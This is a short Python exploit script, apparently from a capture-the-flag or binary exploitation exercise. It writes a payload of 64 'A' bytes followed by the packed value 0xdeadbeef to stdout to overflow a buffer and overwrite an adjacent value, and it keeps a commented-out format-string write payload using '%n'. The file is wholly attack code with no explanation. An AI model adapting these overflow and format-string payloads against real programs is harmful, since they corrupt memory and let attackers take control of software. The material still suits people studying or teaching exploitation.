#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *


buf = b''
#buf += b'%%%uc%%3$n' % 0xdeadbeef
buf += b'A'*64
buf += struct.pack('I', 0xdeadbeef)
buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
